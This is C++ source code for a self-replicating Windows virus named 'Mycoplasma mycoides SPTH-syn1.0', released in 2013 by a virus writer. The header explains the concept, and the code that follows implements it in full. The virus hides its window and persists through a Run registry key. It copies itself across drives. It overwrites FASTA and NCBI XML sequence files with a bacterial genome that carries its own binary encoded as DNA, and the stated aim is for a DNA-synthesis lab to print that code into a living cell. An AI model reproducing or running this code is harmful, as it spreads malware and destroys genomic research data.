//////////////////////////////////////////////////////////////////////////////
//
//  Mycoplasma mycoides SPTH-syn1.0
//  by Second Part To Hell
//  sperl.thomas@gmail.com
//  http://spth.virii.lu/
//  October 2013
//
//  
//  In 2010, the J. Craig Venter Institute (JCVI) reported the creation of a
//  bacterial cell with a chemically synthesized genome [1]. They sequenced
//  the  DNA of a bacteria (M.mycoides), modified several parts of its DNA in
//  the computer, synthetized the novel genome and transplanted it to a
//  different bacteria's cell (M.capricolum). They observed the control of
//  the cell only by the new DNA. The artificially created genome was capable
//  of continuous self-replication.
//  They call their new artificial bacterial Mycoplasma mycoides JCVI-syn1.0.
//      
//     
//  This is the implementation of a computer code that makes the step from the
//  digital to the biological world.
//  The computer code, written in C++, hosts the DNA sequence of M.mycoides
//  JCVI-syn1.0. At runtime it acts as follows:
//       
//    1) Preparing the DNA sequence of M.mycoides JCVI-syn1.0 in the memory,
//       (with slightly modified watermarks).
//    2) Encoding own file-content in base32. The base32 code is then encoded in
//       JCVI's DNA-encoded alphabet.
//    3) This representation of its digital form is then copied to a
//       watermark of the bacteria's genome in memory. With this, a fully
//       functional bacterial DNA sequence including the digital code is 
//       generated.
//    4) Next it searches for FASTA-files on the computer, which are text-based
//       representations of DNA sequences, commonly used by many DNA sequence
//       libraries.
//    5) For each FASTA-file, it replaces the original DNA with the bacterial
//       DNA containing the digital form of the computer code.
//
//        
//  The code has a classical self-replication mechanism as well, to eventually
//  end up on a computer in a microbiology-laboratory with the ability of
//  creating DNA out of digital genomes (such as laboratories by the JCVI).
//     
//  If the scientists are incautious, the computer code's genome (instead of 
//  the intented original DNA) might be written to the biological cell.
//  The new cell will start replicating in the biological world, and with it
//  the representation of the digital computer code.
//
//
//  For detailed information, see my article:
//  "Infection of biological DNA with digital Computer Code" in valhalla#4.
//
//  Thanks to hh86 for motivation. Thanks to the JCVI-team for their awesome
//  research, looking forward reading more discoveries on the boarder between
//  dead and living material!
//
//  [1] Daniel G. Gibson et al., "Creation of a Bacterial Cell Controlled by a
//              Chemically Synthesized Genome", Science 329, 52 (2010).
//
//
//////////////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include <windows.h>
#include <time.h>
#include <stdlib.h>
#pragma comment(lib, "Shlwapi.lib")
#include <Shlwapi.h>
#include <iostream>
#include <string>
#include <vector>
#include <stack>

using namespace std;

#define MyFileSize 1104384

//
// Base32 encoding functions after main()
//
int GetEncode32Length(int);
static bool Encode32Block(unsigned char*, unsigned char*);
bool Encode32(unsigned char*, int, unsigned char*);
bool Map32(unsigned char*, unsigned char*, int, unsigned char*);



int main(int argc, char* argv[])
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    SetErrorMode(0x8007);
    #include "MmycoidesDNA.cpp"          // contains the (modified) DNA of Craig Venter's "Mycoplasma mycoides JCVI-syn1.0"
                                         // very huge, ~1.08 Mbp
    // seed RNG
    srand((unsigned int)time(NULL));		

    // Copy File to temporary directory
    char lpTempPathBuffer[MAX_PATH];
    GetTempPathA(MAX_PATH, lpTempPathBuffer);
    string TmpFileName=lpTempPathBuffer;
    TmpFileName.append("MycoplasmaMycoides.exe");
    CopyFileA(argv[0], TmpFileName.c_str(),FALSE);

    
    // Create a registry key to start-up after every boot-up
    HKEY hKey;
    string lpSubKey="SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    long RegCr=RegCreateKeyExA(HKEY_CURRENT_USER, lpSubKey.c_str(), 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0, &hKey, 0);
    if(RegCr==ERROR_SUCCESS)
    {
        long setRes = RegSetValueExA(hKey, 0, 0, REG_SZ, (BYTE*)TmpFileName.c_str(), TmpFileName.size()+1);        
        RegCloseKey(hKey);
    }


    // Encode own file into Craig Venter's DNA encoding language
    HANDLE hMyFile=CreateFileA(argv[0], GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
    if(hMyFile==INVALID_HANDLE_VALUE) { return(666); }

    HANDLE hMyMap=CreateFileMappingA(hMyFile, 0x0, PAGE_READONLY, 0, MyFileSize, 0);
    if(hMyMap==NULL) { return(666); }

    unsigned char* MapBuf = (unsigned char*) MapViewOfFile(hMyMap, FILE_MAP_READ, 0, 0, MyFileSize);
    if(MapBuf==NULL) { return(666); }

    int encodeLength=GetEncode32Length(MyFileSize);
    unsigned char* data32 = new unsigned char[encodeLength+1];

    if(!Encode32(MapBuf, MyFileSize, data32)) { return(666); } // something strange went wrong. not in the mood to spread in the binary-world without the opportunity to spread to the bio-world! :)

    unsigned char alphabet[] = "TAGAGTTTTATTTAAGGCTACTCACTGGTTGCAAACCAATGCCGTACATTACTAGCTTGATCCTTGGTCGGTCATTGGACTAATAGAGCGGCCTAT"; // ABCDEFGHIJKLMNOPQRSTUVWXYZ234567 encoded in Craig Venter's DNA encoding language. each symbol corresponds to a codon (three nucleotids)
    unsigned char* dataCodon = new unsigned char[3*(encodeLength+1)+1];
    for(int i=0; i<3*(encodeLength+1)+1; i++) { dataCodon[i]=0; }
    Map32(data32, dataCodon, encodeLength, alphabet);

    UnmapViewOfFile(MapBuf);
    CloseHandle(hMyMap);
    CloseHandle(hMyFile);

    string WholeDNA=MmycoidesBeforeWM;
    WholeDNA.append((char*)dataCodon);
    WholeDNA.append(MmycoidesAfterWM);

    string ABC="ABCDEFGHIJKLMNOPQRSTUVWXYZ";   // dirty, but dont want to convert from char to wchar :)
    wstring ABCw=L"ABCDEFGHIJKLMNOPQRSTUVWXYZ";    
    while(true)
    {
        int RndNum=rand()%26;
        
        string CopyPath=ABC.substr(RndNum,1);
        CopyPath.append(":\\MycoplasmaMycoides.exe");
    
        int DriveType=GetDriveTypeA(CopyPath.substr(0,3).c_str());

        if(DriveType>1)
        {
            int res=CopyFileA(argv[0],CopyPath.c_str(),0);

            wstring DriveLetterw=ABCw.substr(RndNum,1)+L":\\";

            stack<wstring> Directories;
            Directories.push(DriveLetterw);
            
            while (!Directories.empty())
            {                
                wstring Path=Directories.top();
                wstring SearchMask=Path+L"\\*";
                Directories.pop();
        
                WIN32_FIND_DATA FileData;
                HANDLE hFind=FindFirstFile(SearchMask.c_str(), &FileData);
                do
                {
                    if (wcscmp(FileData.cFileName, L".") != 0 && wcscmp(FileData.cFileName, L"..") != 0)
                    {
                        wstring FullFileName=Path + L"\\" + FileData.cFileName;                    
                        if (FileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
                        {
                            // Add a directory just in 40% of the cases
                            if(rand()%5>2) { Directories.push(FullFileName); }
                        }
                        else
                        {
                            wstring FileExtention=PathFindExtension(FullFileName.c_str());
                            if(_wcsnicmp(FileExtention.c_str(), L".fasta",6)==0 || _wcsnicmp(FileExtention.c_str(), L".fas",4)==0)
                            {
                                string WholeDNA_FASTA="";
                                for(int i=0; i<=(int)(WholeDNA.size()/70); i++)
                                {
                                    WholeDNA_FASTA.append(WholeDNA.substr(70*i,70)+(char)10);
                                }
                                HANDLE hFastaVictim=CreateFile(FullFileName.c_str(), (GENERIC_READ | GENERIC_WRITE), 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
                                if(hFastaVictim!=INVALID_HANDLE_VALUE)
                                {
                                    string FastaHeader="";
                                    DWORD FastaSize=GetFileSize(hFastaVictim, 0);
                                    if(FastaSize>0)
                                    {
                                        HANDLE hFastaMapping=CreateFileMapping(hFastaVictim, 0, PAGE_READWRITE, 0, FastaSize, 0);
                                        if(hFastaMapping!=NULL)
                                        {
                                            char* lpMapAddress=(char*)MapViewOfFile(hFastaMapping, FILE_MAP_ALL_ACCESS, 0, 0, FastaSize);
                                            if(lpMapAddress!=NULL)
                                            {
                                                string FastaContent=lpMapAddress;

                                                int FindLBinFasta=FastaContent.find((char)10,0);                                            
                                                if(FindLBinFasta>0&&FastaContent[0]=='>')  // .fasta files have to start with ">"
                                                {
                                                    FastaHeader=FastaContent.substr(0,FindLBinFasta+1); // this is the header of the FASTA file including the 0x0A
                                                }
                                            }
                                            UnmapViewOfFile(lpMapAddress);
                                        }
                                        CloseHandle(hFastaMapping);
                                        if(FastaHeader.size()>0)
                                        {
                                            HANDLE hFastaMapping=CreateFileMapping(hFastaVictim, 0, PAGE_READWRITE, 0, FastaHeader.size()+WholeDNA_FASTA.size()+1, 0);
                                            if(hFastaMapping!=NULL)
                                            {
                                                char* lpMapAddress=(char*)MapViewOfFile(hFastaMapping, FILE_MAP_ALL_ACCESS, 0, 0, FastaHeader.size()+WholeDNA_FASTA.size()+1);
                                                if(lpMapAddress!=NULL)
                                                {
                                                    string FastaInfCode=FastaHeader+WholeDNA_FASTA;
                                                    strcpy_s(lpMapAddress, FastaHeader.size()+WholeDNA_FASTA.size()+1, FastaInfCode.c_str());
                                                }
                                                UnmapViewOfFile(lpMapAddress);
                                                CloseHandle(hFastaMapping);
                                                SetFilePointer(hFastaVictim, FastaHeader.size()+WholeDNA_FASTA.size(), 0, 0);
                                                SetEndOfFile(hFastaVictim);
                                            }
                                        }
                                    }
                                    CloseHandle(hFastaVictim);

                                    if(rand()%1000==33)
                                    {
                                        // At every 1000th fasta-file infection, we show ourselves.
                                        int num=rand()%3;
                                        if(num==0) { MessageBoxA(0, "'to live, to err, to fall, to triumph, to recreate life out of life.' - james joyce", "Mycoplasma mycoides SPTH-syn1.0", 0); }
                                        if(num==1) { MessageBoxA(0, "'see things not as they are, but as they might be.'", "Mycoplasma mycoides SPTH-syn1.0", 0); }                                        
                                        if(num==2) { MessageBoxA(0, "'what i cannot build, i cannot understand.' - richard feynman", "Mycoplasma mycoides SPTH-syn1.0", 0); }
                                    }
                                }
                            }

                            if(_wcsnicmp(FileExtention.c_str(), L".xml",4)==0)
                            {
                                HANDLE hxmlFastaVictim=CreateFile(FullFileName.c_str(), (GENERIC_READ | GENERIC_WRITE), 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
                                if(hxmlFastaVictim!=INVALID_HANDLE_VALUE)
                                {
                                    string xmlFastaBefore="";
                                    string xmlFastaAfter="";
                                    DWORD xmlFastaSize=GetFileSize(hxmlFastaVictim, 0);
                                    if(xmlFastaSize>0)
                                    {
                                        HANDLE hxmlFastaMapping=CreateFileMapping(hxmlFastaVictim, 0, PAGE_READWRITE, 0, xmlFastaSize, 0);
                                        if(hxmlFastaMapping!=NULL)
                                        {
                                            char* lpMapAddress=(char*)MapViewOfFile(hxmlFastaMapping, FILE_MAP_ALL_ACCESS, 0, 0, xmlFastaSize);
                                            if(lpMapAddress!=NULL)
                                            {
                                                string xmlFastaContent=lpMapAddress;

                                                int FindSeqStart=xmlFastaContent.find("<TSeq_sequence>",0);
                                                int FindSeqEnd=xmlFastaContent.find("</TSeq_sequence>",FindSeqStart);
                                                int FindIsNuc=xmlFastaContent.find("<TSeq_seqtype value=\"nucleotide\"",0);
                                                if(FindSeqStart>0 && FindSeqEnd>0 && FindIsNuc>0)
                                                {
                                                    xmlFastaBefore=xmlFastaContent.substr(0,FindSeqStart+15); // this is the xml fasta content before DNA
                                                    xmlFastaAfter=xmlFastaContent.substr(FindSeqEnd);
                                                }
                                            }
                                            UnmapViewOfFile(lpMapAddress);
                                        }
                                        CloseHandle(hxmlFastaMapping);
                                        if(xmlFastaBefore.size()>0 && xmlFastaAfter.size())
                                        {
                                            HANDLE hxmlFastaMapping=CreateFileMapping(hxmlFastaVictim, 0, PAGE_READWRITE, 0, xmlFastaBefore.size()+WholeDNA.size()+xmlFastaAfter.size()+1, 0);
                                            if(hxmlFastaMapping!=NULL)
                                            {
                                                char* lpMapAddress=(char*)MapViewOfFile(hxmlFastaMapping, FILE_MAP_ALL_ACCESS, 0, 0, xmlFastaBefore.size()+WholeDNA.size()+xmlFastaAfter.size()+1);
                                                if(lpMapAddress!=NULL)
                                                {
                                                    string xmlFastaInfCode=xmlFastaBefore+WholeDNA+xmlFastaAfter;
                                                    strcpy_s(lpMapAddress, xmlFastaInfCode.size()+1, xmlFastaInfCode.c_str());
                                                }
                                                UnmapViewOfFile(lpMapAddress);
                                                CloseHandle(hxmlFastaMapping);
                                                SetFilePointer(hxmlFastaVictim, xmlFastaBefore.size()+WholeDNA.size()+xmlFastaAfter.size(), 0, 0);
                                                SetEndOfFile(hxmlFastaVictim);
                                            }
                                        }
                                    }
                                    CloseHandle(hxmlFastaVictim);
                                }
                            }
                        }
                    }                    
                } while (FindNextFile(hFind, &FileData) != 0);
                FindClose(hFind);
                if(rand()%5==1)
                {
                    int wait1=rand()%500;
                    Sleep(wait1);
                }
            }
        }
        int waitwait=(rand()%1000+250);
        Sleep(waitwait);
    }
    return 0;
}



////////////////////////////////////////////////////////////////////////////////////////////////
// Modified base32 encoder strongly based on Vasian Cepa's code -  http://madebits.com
// adjusted for codon-alphabet
////////////////////////////////////////////////////////////////////////////////////////////////

int GetEncode32Length(int bytes)
{
   int bits = bytes * 8;
   int length = bits / 5;
   if((bits % 5) > 0)
   {
      length++;
   }
   return length;
}

static bool Encode32Block(unsigned char* in5, unsigned char* out8)
{
      // pack 5 bytes
      unsigned __int64 buffer = 0;
      for(int i = 0; i < 5; i++)
      {
          if(i != 0)
          {
              buffer = (buffer << 8);
          }
          buffer = buffer | in5[i];
      }
      // output 8 bytes
      for(int j = 7; j >= 0; j--)
      {
          buffer = buffer << (24 + (7 - j) * 5);
          buffer = buffer >> (24 + (7 - j) * 5);
          unsigned char c = (unsigned char)(buffer >> (j * 5));
          // self check
          if(c >= 32) return false;
          out8[7 - j] = c;
      }
      return true;
}

bool Encode32(unsigned char* in, int inLen, unsigned char* out)
{
   if((in == 0) || (inLen <= 0) || (out == 0)) return false;

   int d = inLen / 5;
   int r = inLen % 5;

   unsigned char outBuff[8];

   for(int j = 0; j < d; j++)
   {
      if(!Encode32Block(&in[j * 5], &outBuff[0])) return false;
      memmove(&out[j * 8], &outBuff[0], sizeof(unsigned char) * 8);
   }

   unsigned char padd[5];
   memset(padd, 0, sizeof(unsigned char) * 5);
   for(int i = 0; i < r; i++)
   {
      padd[i] = in[inLen - r + i];
   }
   if(!Encode32Block(&padd[0], &outBuff[0])) return false;
   memmove(&out[d * 8], &outBuff[0], sizeof(unsigned char) * GetEncode32Length(r));

   return true;
}

bool Map32(unsigned char* in32, unsigned char* out32, int inout32Len, unsigned char* alpha32)
{
    if((in32 == 0) || (inout32Len <= 0) || (alpha32 == 0)) return false;
    for(int i = 0; i < inout32Len; i++)
    {        
        if(in32[i] >=32) return false;
        out32[3*i] = alpha32[3*in32[i]];
        out32[3*i+1] = alpha32[3*in32[i]+1];
        out32[3*i+2] = alpha32[3*in32[i]+2];
    }
    out32[3*inout32Len] = 'C';   // final byte is '=', in JCGI alphabet '=' <-> CCA
    out32[3*inout32Len+1] = 'C';
    out32[3*inout32Len+2] = 'A';
    return true;
}